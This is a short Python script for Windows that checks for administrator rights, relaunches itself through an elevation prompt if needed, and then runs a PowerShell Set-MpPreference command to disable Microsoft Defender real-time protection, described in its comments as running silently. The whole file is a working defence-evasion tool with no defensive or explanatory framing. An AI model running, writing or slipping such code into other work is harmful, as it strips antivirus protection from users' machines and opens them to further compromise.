import ctypes
import subprocess
import os
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def disable_realtime_protection():
    # Command to disable real-time protection using PowerShell
    powershell_cmd = 'Set-MpPreference -DisableRealtimeMonitoring $true'

    try:
        # Run PowerShell command silently
        subprocess.run(['powershell', '-Command', powershell_cmd], check=True, shell=True)
        print("Real-time protection disabled successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to disable real-time protection. {e}")
        sys.exit(1)

def main():
    if is_admin():
        # Disable real-time protection
        disable_realtime_protection()
    else:
        # Re-run the script with admin rights
        print("Script requires admin rights. Re-running with elevated privileges...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

if __name__ == "__main__":
    main()
